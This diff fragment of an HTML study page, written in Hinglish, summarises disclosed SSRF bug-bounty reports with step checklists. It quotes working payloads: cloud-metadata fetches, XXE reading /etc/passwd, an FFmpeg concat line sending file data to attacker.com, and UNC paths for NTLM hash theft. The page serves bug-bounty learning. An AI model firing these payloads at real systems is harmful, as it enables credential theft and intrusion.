+                        <div class="report-target">🎯 Ghost CMS · @whoareme · Medium (4.4) · $500-$1,000</div>
+                        <div style="margin-top:8px;"><span class="technique-tag">oEmbed Discovery</span><span
+                                class="technique-tag">Second-Order SSRF</span><span class="technique-tag">HTML Link
+                                Tag</span></div>
+                    </div><span class="severity-badge sev-medium">🟡 MEDIUM</span>
+                </div>
+                <div class="card-body">
+                    <div class="scenario-box">
+                        <div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text">Ghost CMS embed feature mein <code
+                                class="c">getOembedUrlFromHTML()</code> function HTML se oEmbed URL nikalta tha bina
+                            validation ke. Hacker ne malicious HTML page banaya: <code
+                                class="c">&lt;link type="application/json+oembed" href="http://169.254.169.254/"&gt;</code>.
+                            Ghost ne pehle hacker ka page fetch kiya, phir usmein se internal URL nikaal kar doosri
+                            request bheji → DigitalOcean metadata leak!</div>
+                    </div>
+                    <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">01</span><span
+                                class="item-text"><strong>Meta-Tag discovery test karo</strong> — oEmbed, OpenGraph
+                                (<code class="c">og:image</code>), Twitter Cards ke tags mein internal IPs daal ke
+                                dekho.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">02</span><span
+                                class="item-text"><strong>Bridge server banao</strong> — Seedha 127.0.0.1 dalne ke
+                                bajaye, apne server se meta-tag bypass use karo.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">03</span><span
+                                class="item-text"><strong>Admin APIs check karo</strong> — Admin panels mein extra
+                                features (oEmbed preview) hote hain jahan SSRF asaan hai.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">04</span><span
+                                class="item-text"><strong>Double fetch verify karo</strong> — Server ne tera page fetch
+                                kiya? Ab us page ke andar jo URL hai use bhi fetch karega?</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">05</span><span
+                                class="item-text"><strong>Response data check karo</strong> — Cloud metadata mein
+                                Droplet/Instance ki sensitive details dikhi?</span>
+                        </li>
+                    </ul>
+                    <div class="mindset-box">
+                        <div class="mindset-label">👑 VETERAN MINDSET</div>
+                        <div class="mindset-text">"Trusting data from a trusted fetch is dangerous. Ghost ne pehle fetch
+                            par toh bharosa kiya, par us fetch ke andar se jo naya URL nikla, use validate karna bhool
+                            gaye."</div>
+                    </div>
+                    <div class="card-progress">
+                        <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                                class="card-progress-pct">0%</span></div>
+                        <div class="card-bar-wrap">
+                            <div class="card-bar-fill"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- REPORT #06 -->
+            <div class="report-card" data-severity="high" id="report-06">
+                <div class="card-header">
+                    <div class="card-meta">
+                        <div class="report-number">◈ REPORT #06 · Category 35.7 · CVE-2025-4123</div>
+                        <div class="report-title">Grafana Chain — Open Redirect + XSS + SSRF via Image Renderer (DoD)
+                        </div>
+                        <div class="report-target">🎯 DoD Grafana · @khoof · High (7.6) · VDP</div>
+                        <div style="margin-top:8px;"><span class="technique-tag">Open Redirect</span><span
+                                class="technique-tag">Stored XSS</span><span class="technique-tag">Image Renderer
+                                SSRF</span><span class="technique-tag">CVE Chain</span></div>
+                    </div><span class="severity-badge sev-high">🟠 HIGH</span>
+                </div>
+                <div class="card-body">
+                    <div class="scenario-box">
+                        <div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text">3-bug chain: (1) <code class="c">/public/..%2F</code> path traversal
+                            se Open Redirect, (2) Fake plugin load करके Stored XSS, (3) Image Renderer plugin se <code
+                                class="c">http://169.254.169.254/</code> fetch → AWS IAM credentials leak. Anonymous
+                            access enabled tha toh bina login ke bhi attack possible!</div>
+                    </div>
+                    <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">01</span><span
+                                class="item-text"><strong>Open Redirect ko ignore mat karo</strong> — Dekho kya usse XSS
+                                ya SSRF chain ho sakta hai?</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">02</span><span
+                                class="item-text"><strong>Default plugins check karo</strong> — Grafana, Kibana,
+                                WordPress mein Image Renderer jaise plugins aksar SSRF ka rasta hoti hain.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">03</span><span
+                                class="item-text"><strong>Cloud context analyze karo</strong> — Target AWS/GCP par hai
+                                toh SSRF ka impact hamesha "Critical" hota hai.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">04</span><span
+                                class="item-text"><strong>Anonymous access check karo</strong> — <code
+                                    class="c">enabled = true</code> hai toh unauthenticated attack possible hai.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">05</span><span
+                                class="item-text"><strong>Version detect karo</strong> — Grafana 8.x-12.x vulnerable
+                                versions identify karo.</span>
+                        </li>
+                    </ul>
+                    <div class="chain-box">
+                        <div class="chain-label">⛓️ CHAIN FORMULA</div>
+                        <div class="chain-formula">Path Traversal → Open Redirect → Malicious Plugin Load → Stored XSS →
+                            Image Renderer SSRF → AWS IAM Leak → Full Compromise</div>
+                    </div>
+                    <div class="card-progress">
+                        <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                                class="card-progress-pct">0%</span></div>
+                        <div class="card-bar-wrap">
+                            <div class="card-bar-fill"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </section>
+
+    <!-- ═══ PHASE 2 — BLIND SSRF & RENDERING ATTACKS ═══ -->
+    <section class="phase-section" id="phase2">
+        <div class="phase-header"><span class="phase-number">PHASE 02</span><span class="phase-title">BLIND SSRF &
+                SERVER-SIDE RENDERING</span><span class="phase-count" id="p2count">0 / 6 reports</span></div>
+        <div class="cards-grid" id="grid-phase2">
+
+            <!-- REPORT #07 -->
+            <div class="report-card" data-severity="low" id="report-07">
+                <div class="card-header">
+                    <div class="card-meta">
+                        <div class="report-number">◈ REPORT #07 · Category 35.8</div>
+                        <div class="report-title">SVG Style Bypass — PDF Renderer SSRF (Shopify)</div>
+                        <div class="report-target">🎯 Shopify Packing Slip · @cthulhufhtagn · Low (2.0) · $500</div>
+                        <div style="margin-top:8px;"><span class="technique-tag">HTML Injection</span><span
+                                class="technique-tag">PDF Renderer</span><span class="technique-tag">Parser
+                                Differential</span></div>
+                    </div><span class="severity-badge sev-low">🟢 LOW</span>
+                </div>
+                <div class="card-body">
+                    <div class="scenario-box">
+                        <div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text">Shopify Packing Slip template mein <code
+                                class="c">&lt;iframe&gt;</code> blocked tha. Hacker ne <code
+                                class="c">&lt;svg&gt;&lt;style&gt;&lt;h1/&gt;&lt;iframe src="https://kubernetes.default.svc/version"&gt;</code>
+                            inject kiya → HTML filter confused → PDF generator ne Kubernetes internal service hit karke
+                            version info PDF mein print kiya!</div>
+                    </div>
+                    <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">01</span><span
+                                class="item-text"><strong>Document generators test karo</strong> — HTML→PDF, HTML→PNG,
+                                HTML→JPG — har jagah HTML injection + SSRF check karo.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">02</span><span
+                                class="item-text"><strong>Obscure tags try karo</strong> — <code
+                                    class="c">&lt;iframe&gt;</code> block hai toh <code class="c">&lt;embed&gt;</code>,
+                                <code class="c">&lt;object&gt;</code>, <code class="c">&lt;svg&gt;</code> combinations
+                                try karo.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">03</span><span
+                                class="item-text"><strong>Internal DNS names try karo</strong> — <code
+                                    class="c">kubernetes.default</code>, <code class="c">internal-api.local</code>,
+                                <code class="c">localhost</code></span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">04</span><span
+                                class="item-text"><strong>Parser Differential exploit karo</strong> — Ek parser (filter)
+                                safe mane, doosra parser (PDF Generator) execute kare.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">05</span><span
+                                class="item-text"><strong>Kubernetes endpoints check karo</strong> — <code
+                                    class="c">/livez?verbose</code>, <code class="c">/version</code>, <code
+                                    class="c">/healthz</code></span>
+                        </li>
+                    </ul>
+                    <div class="protip-box">
+                        <div class="protip-label">💡 PRO TIP</div>
+                        <div class="protip-text">Filters are only as good as their parser. Nested SVG/Style tags backend
+                            parser ko "blind" kar dete hain — Parser Differential ka fayda uthao!</div>
+                    </div>
+                    <div class="card-progress">
+                        <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                                class="card-progress-pct">0%</span></div>
+                        <div class="card-bar-wrap">
+                            <div class="card-bar-fill"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- REPORT #08 -->
+            <div class="report-card" data-severity="na" id="report-08">
+                <div class="card-header">
+                    <div class="card-meta">
+                        <div class="report-number">◈ REPORT #08 · FALSE POSITIVE LESSON</div>
+                        <div class="report-title">False SSRF Claim — Referer Header Manipulation (Yelp)</div>
+                        <div class="report-target">🎯 yelp-support.com · @raja404 · N/A</div>
+                        <div style="margin-top:8px;"><span class="technique-tag">False Positive</span><span
+                                class="technique-tag">Referer Header</span><span class="technique-tag">Learning
+                                Report</span></div>
+                    </div><span class="severity-badge sev-na">⚪ N/A</span>
+                </div>
+                <div class="card-body">
+                    <div class="scenario-box">
+                        <div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text">Hacker ne Referer header badal kar <code
+                                class="c">https://evil.com/</code> kiya. Server ne 200 OK diya. Hacker ne socha SSRF hai
+                            — par server ne sirf header ignore kiya, koi internal request nahi bheji. <strong>Ye SSRF
+                                nahi hai!</strong></div>
+                    </div>
+                    <div class="checklist-label">✅ FALSE POSITIVE PREVENTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">01</span><span
+                                class="item-text"><strong>Dnslog/Webhook test karo</strong> — Kya server ne waqai mere
+                                URL par GET request bheji? (<code class="c">webhook.site</code> ya Burp Collaborator use
+                                karo)</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">02</span><span
+                                class="item-text"><strong>Data leak confirm karo</strong> — Kya internal metadata ya
+                                <code class="c">/etc/passwd</code> dekh pa rahe ho?</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">03</span><span
+                                class="item-text"><strong>Control verify karo</strong> — Kya tum server ko kisi bhi IP
+                                par bhej sakte ho, ya wo sirf static files serve kar raha hai?</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">04</span><span
+                                class="item-text"><strong>Real vs Fake samjho</strong> — Header badalna ≠ Server action.
+                                SSRF tabhi hai jab server TERI URL par request bheje.</span>
+                        </li>
+                    </ul>
+                    <div class="impact-box">
+                        <div class="impact-label">⚠️ KEY LESSON</div>
+                        <div class="impact-text">"Every 200 OK is not a bug." Real SSRF mein server TERI URL ko fetch
+                            karta hai. Sirf header badalne se kuch nahi hota. PortSwigger labs isliye ki hain taaki Real
+                            aur False bug mein farq samajh sake.</div>
+                    </div>
+                    <div class="card-progress">
+                        <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                                class="card-progress-pct">0%</span></div>
+                        <div class="card-bar-wrap">
+                            <div class="card-bar-fill"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- REPORT #09 -->
+            <div class="report-card" data-severity="high" id="report-09">
+                <div class="card-header">
+                    <div class="card-meta">
+                        <div class="report-number">◈ REPORT #09 · Category 35.9</div>
+                        <div class="report-title">Chaining Double SSRF — Local File Read via Protocol Smuggling
+                            (PlayStation)</div>
+                        <div class="report-target">🎯 image.api.np.km.playstation.net · @bugdiscloseguys · High · $1,000
+                        </div>
+                        <div style="margin-top:8px;"><span class="technique-tag">Chained SSRF</span><span
+                                class="technique-tag">file:// Protocol</span><span
+                                class="technique-tag">PhantomJS</span></div>
+                    </div><span class="severity-badge sev-high">🟠 HIGH</span>
+                </div>
+                <div class="card-body">
+                    <div class="scenario-box">
+                        <div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text">Do SSRF endpoints chain kiye: Endpoint A (image.api) → Endpoint B
+                            (dis.api internal banner generator jo PhantomJS use karta tha aur <code
+                                class="c">file://</code> protocol support karta tha). Flow: Hacker → image.api
+                            (External) → dis.api (Internal) → <code
+                                class="c">file:////usr/share/pixmaps/system-logo-white.png</code> → Local file read!
+                        </div>
+                    </div>
+                    <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">01</span><span
+                                class="item-text"><strong>403 pe mat ruko</strong> — Internal host hit karne par 403
+                                Forbidden milta hai toh samjho host accessible hai. Aur endpoints dhoondho.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">02</span><span
+                                class="item-text"><strong>Chain vulnerabilities</strong> — Ek SSRF limited hai (sirf
+                                GET)? Doosra SSRF ya XSS dhoondho jo zyada impact de.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">03</span><span
+                                class="item-text"><strong>Rendering engines check karo</strong> — PhantomJS, Selenium,
+                                wkhtmltopdf aksar <code class="c">file://</code> support karte hain — SSRF
+                                jackpot!</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">04</span><span
+                                class="item-text"><strong>Internal subdomains scan karo</strong> — <code
+                                    class="c">mgmt</code>, <code class="c">dis.api</code>, <code
+                                    class="c">store.mgmt</code> jaise internal hosts dhoondho.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">05</span><span
+                                class="item-text"><strong>Protocol smuggling try karo</strong> — Pehle SSRF par <code
+                                    class="c">file://</code> nahi chala? Internal host dhoondho jo <code
+                                    class="c">file://</code> allow kare.</span>
+                        </li>
+                    </ul>
+                    <div class="chain-box">
+                        <div class="chain-label">⛓️ CHAIN FORMULA</div>
+                        <div class="chain-formula">External SSRF → Internal SSRF → file:// Protocol → Local File Read →
+                            System Compromise</div>
+                    </div>
+                    <div class="card-progress">
+                        <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                                class="card-progress-pct">0%</span></div>
+                        <div class="card-bar-wrap">
+                            <div class="card-bar-fill"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- REPORT #10 -->
+            <div class="report-card" data-severity="critical" id="report-10">
+                <div class="card-header">
+                    <div class="card-meta">
+                        <div class="report-number">◈ REPORT #10 · Category 35.10</div>
+                        <div class="report-title">XXE to SSRF/LFI — SVG Emblem Editor Exploit (Rockstar Games)</div>
+                        <div class="report-target">🎯 Rockstar Social Club · @alexbirsan · Critical · $1,500</div>
+                        <div style="margin-top:8px;"><span class="technique-tag">XXE</span><span
+                                class="technique-tag">SVG Upload</span><span
+                                class="technique-tag">ImageMagick</span><span class="technique-tag">XInclude</span>
+                        </div>
+                    </div><span class="severity-badge sev-critical">🔴 CRITICAL</span>
+                </div>
+                <div class="card-body">
+                    <div class="scenario-box">
+                        <div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text">Emblem editor mein SVG upload/edit → Backend ImageMagick se render →
+                            SVG = XML → Hacker ne <code class="c">&lt;!ENTITY&gt;</code> declaration inject ki + <code
+                                class="c">XInclude</code> use kiya → Server ne local files (<code
+                                class="c">C:/Windows/system32/drivers/etc/hosts</code>) read ki aur internal server data
+                            emblem image mein render karke dikha diya!</div>
+                    </div>
+                    <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">01</span><span
+                                class="item-text"><strong>SVG = XML yaad rakhna</strong> — Jahan bhi SVG upload/edit ho,
+                                wahan hamesha XXE test karo.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">02</span><span
+                                class="item-text"><strong>XInclude try karo</strong> — Normal XXE block hai? <code
+                                    class="c">&lt;xi:include href="http://internal/"&gt;</code> aksar filters miss karte
+                                hain.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">03</span><span
+                                class="item-text"><strong>Visual exfiltration use karo</strong> — Data image par render
+                                karwa kar chori karo (jaise Rockstar mein hua).</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">04</span><span
+                                class="item-text"><strong>SMB bypass try karo</strong> — <code
+                                    class="c">//attacker.com/malicious.svg</code> se double forward slash bypass.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">05</span><span
+                                class="item-text"><strong>External DTD use karo</strong> — <code
+                                    class="c">&lt;!ENTITY % xxe SYSTEM "file:///etc/passwd"&gt;</code></span>
+                        </li>
+                    </ul>
+                    <div class="mindset-box">
+                        <div class="mindset-label">👑 VETERAN MINDSET</div>
+                        <div class="mindset-text">"Complex files bring complex risks. Rockstar ne socha wo logo
+                            processing kar rahe hain, par hacker ne use ek data exfiltration tool bana diya."</div>
+                    </div>
+                    <div class="card-progress">
+                        <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                                class="card-progress-pct">0%</span></div>
+                        <div class="card-bar-wrap">
+                            <div class="card-bar-fill"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- REPORT #11 -->
+            <div class="report-card" data-severity="low" id="report-11">
+                <div class="card-header">
+                    <div class="card-meta">
+                        <div class="report-number">◈ REPORT #11 · Category 35.11</div>
+                        <div class="report-title">Screenshot Service Token Leak — JS Redirect (Shopify)</div>
+                        <div class="report-target">🎯 Shopify Theme Preview · @corraldev · None (0.0) · $500</div>
+                        <div style="margin-top:8px;"><span class="technique-tag">Screenshot Service</span><span
+                                class="technique-tag">JS Redirect</span><span class="technique-tag">Token Leak</span>
+                        </div>
+                    </div><span class="severity-badge sev-low">🟢 LOW</span>
+                </div>
+                <div class="card-body">
+                    <div class="scenario-box">
+                        <div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text">Theme ke <code class="c">header.liquid</code> mein JS redirect dala →
+                            Screenshot service ne JS execute kiya → Burp Collaborator par redirect hua → Request headers
+                            mein <code class="c">X-ABS-App-Token: screenshot-service-production@████</code> leak hua!
+                            Information = Bounty.</div>
+                    </div>
+                    <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">01</span><span
+                                class="item-text"><strong>Screenshot/PDF tools test karo</strong> — URL to Image/PDF
+                                services ko redirect karne ki koshish karo.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">02</span><span
+                                class="item-text"><strong>Headers analyze karo</strong> — Server request bheje toh
+                                User-Agent, Internal-Tokens, IP-Addresses check karo.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">03</span><span
+                                class="item-text"><strong>JS execution check karo</strong> — Server-side renderer JS
+                                execute karta hai? XSS to SSRF ka rasta hai.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">04</span><span
+                                class="item-text"><strong>Burp Collaborator hamesha chalao</strong> — OAST testing ke
+                                bina Blind SSRF prove nahi hota.</span>
+                        </li>
+                    </ul>
+                    <div class="protip-box">
+                        <div class="protip-label">💡 PRO TIP</div>
+                        <div class="protip-text">Information is also a bounty! Hacker ne koi server crash nahi kiya, par
+                            Secret Token bahar jhank raha tha. Shopify ne $500 diye appreciation mein.</div>
+                    </div>
+                    <div class="card-progress">
+                        <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                                class="card-progress-pct">0%</span></div>
+                        <div class="card-bar-wrap">
+                            <div class="card-bar-fill"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- REPORT #12 -->
+            <div class="report-card" data-severity="high" id="report-12">
+                <div class="card-header">
+                    <div class="card-meta">
+                        <div class="report-number">◈ REPORT #12 · Category 35.12</div>
+                        <div class="report-title">FFmpeg m3u8 Playlist SSRF — LFE & DoS (Imgur)</div>
+                        <div class="report-target">🎯 imgur.com · @aesteral · High/Critical · $1,000+</div>
+                        <div style="margin-top:8px;"><span class="technique-tag">FFmpeg</span><span
+                                class="technique-tag">m3u8 Playlist</span><span class="technique-tag">concat
+                                Protocol</span><span class="technique-tag">LFE</span></div>
+                    </div><span class="severity-badge sev-high">🟠 HIGH</span>
+                </div>
+                <div class="card-body">
+                    <div class="scenario-box">
+                        <div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text">Imgur Video-to-GIF mein FFmpeg use hota tha. Hacker ne PHP script
+                            banayi jo Content-Type <code class="c">video/avi</code> bhejti thi par andar m3u8 playlist
+                            code tha. FFmpeg ne playlist read ki → SSRF + <code
+                                class="c">concat:file:///etc/passwd|http://attacker.com/</code> se Local File
+                            Enumeration + Tarpit se DoS!</div>
+                    </div>
+                    <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">01</span><span
+                                class="item-text"><strong>Processing tools identify karo</strong> — Backend FFmpeg,
+                                ImageMagick, Ghostscript hai? User-Agent header se confirm karo.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">02</span><span
+                                class="item-text"><strong>File formats alag try karo</strong> — Extension .mp4 par
+                                content m3u8, SVG, XML daal ke dekho.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">03</span><span
+                                class="item-text"><strong>concat protocol test karo</strong> — <code
+                                    class="c">concat:file:///etc/passwd|http://attacker.com/</code> se file existence
+                                check karo.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">04</span><span
+                                class="item-text"><strong>Chain with CVEs</strong> — Purane versions (lavf 55.x) mein
+                                known CVEs dhoondho jo SSRF ko RCE mein badal sakein.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">05</span><span
+                                class="item-text"><strong>DoS potential test karo</strong> — Infinite playlist loops se
+                                server resource exhaustion possible?</span>
+                        </li>
+                    </ul>
+                    <div class="mindset-box">
+                        <div class="mindset-label">👑 VETERAN MINDSET</div>
+                        <div class="mindset-text">"Trusting a tool's default configuration is a risk. FFmpeg itna
+                            powerful hai ki agar dhang se lock na kiya jaye, toh wo khud ek hacking tool ban jata hai."
+                        </div>
+                    </div>
+                    <div class="card-progress">
+                        <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                                class="card-progress-pct">0%</span></div>
+                        <div class="card-bar-wrap">
+                            <div class="card-bar-fill"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </section>
+
+    <!-- ═══ PHASE 3 — CLOUD METADATA & PROTOCOL ATTACKS ═══ -->
+    <section class="phase-section" id="phase3">
+        <div class="phase-header"><span class="phase-number">PHASE 03</span><span class="phase-title">CLOUD METADATA &
+                PROTOCOL ATTACKS</span><span class="phase-count" id="p3count">0 / 6 reports</span></div>
+        <div class="cards-grid" id="grid-phase3">
+
+            <!-- REPORT #13 -->
+            <div class="report-card" data-severity="high" id="report-13">
+                <div class="card-header">
+                    <div class="card-meta">
+                        <div class="report-number">◈ REPORT #13 · Category 35.13</div>
+                        <div class="report-title">DNS Rebinding SSRF — Burp Suite MCP Server SOP Bypass</div>
+                        <div class="report-target">🎯 Burp Suite MCP Server · @farmer · High · $2,000 Bonus</div>
+                        <div style="margin-top:8px;"><span class="technique-tag">DNS Rebinding</span><span
+                                class="technique-tag">SOP Bypass</span><span class="technique-tag">Localhost
+                                Service</span></div>
+                    </div><span class="severity-badge sev-high">🟠 HIGH</span>
+                </div>
+                <div class="card-body">
+                    <div class="scenario-box">
+                        <div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text">Burp MCP Server <code class="c">localhost:9876</code> par bina Origin
+                            Validation ke chal raha tha. Hacker ne <code class="c">7f000001.rbndr.us</code> se DNS
+                            Rebinding ki → Browser ko laga evil.com = localhost → <code
+                                class="c">send_http1_request</code> tool se internal network scan + <code
+                                class="c">get_proxy_http_history</code> se victim ki poori HTTP history chura li!</div>
+                    </div>
+                    <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">01</span><span
+                                class="item-text"><strong>Local ports check karo</strong> — Burp, Discord, Slack,
+                                Spotify — koi local port open karta hai? DNS Rebinding test karo.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">02</span><span
+                                class="item-text"><strong>API capabilities analyze karo</strong> — Local API HTTP
+                                requests bhej sakti hai (<code class="c">send_request</code>)? Goldmine hai.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">03</span><span
+                                class="item-text"><strong>CORS/Origin check karo</strong> — <code
+                                    class="c">Access-Control-Allow-Origin: *</code> hai? Insecure hai.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">04</span><span
+                                class="item-text"><strong>rbndr.us domain setup karo</strong> — Pehle hacker IP, phir
+                                127.0.0.1 resolve ho.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">05</span><span
+                                class="item-text"><strong>Data theft tools dhoondho</strong> — History read, scan
+                                execute — kya kya possible hai?</span>
+                        </li>
+                    </ul>
+                    <div class="mindset-box">
+                        <div class="mindset-label">👑 VETERAN MINDSET</div>
+                        <div class="mindset-text">"Trusting the Localhost is a fallacy. PortSwigger ne apne hi tool mein
+                            ye galti ki, par unhone hacker ko $2,000 bonus dekar appreciate kiya."</div>
+                    </div>
+                    <div class="card-progress">
+                        <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                                class="card-progress-pct">0%</span></div>
+                        <div class="card-bar-wrap">
+                            <div class="card-bar-fill"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- REPORT #14 -->
+            <div class="report-card" data-severity="na" id="report-14">
+                <div class="card-header">
+                    <div class="card-meta">
+                        <div class="report-number">◈ REPORT #14 · Category 35.14</div>
+                        <div class="report-title">Windows UNC Path SSRF — NTLM Hash Theft via file:// (curl)</div>
+                        <div class="report-target">🎯 curl (Windows Build) · @im4x · N/A (OS Feature)</div>
+                        <div style="margin-top:8px;"><span class="technique-tag">UNC Path</span><span
+                                class="technique-tag">NTLM Theft</span><span class="technique-tag">SMB Protocol</span>
+                        </div>
+                    </div><span class="severity-badge sev-na">⚪ N/A</span>
+                </div>
+                <div class="card-body">
+                    <div class="scenario-box">
+                        <div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text"><code class="c">file://attacker.com/share/file.txt</code> → Windows
+                            automatically <code class="c">\\attacker.com\share</code> SMB connection banata hai → NTLM
+                            credentials (Username + Hash) auto-send! Responder tool se hash capture → Offline crack →
+                            Password steal. OS ka default behaviour = Security hole.</div>
+                    </div>
+                    <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">01</span><span
+                                class="item-text"><strong>UNC paths test karo</strong> — Koi app URL mang rahi hai?
+                                <code class="c">file://[IP]/share</code> daal ke dekho SMB connection banta hai?</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">02</span><span
+                                class="item-text"><strong>NTLM hashes capture karo</strong> — <code
+                                    class="c">Responder</code> ya <code class="c">impacket-smbserver</code> chalao
+                                credentials leak dekhne ke liye.</span>
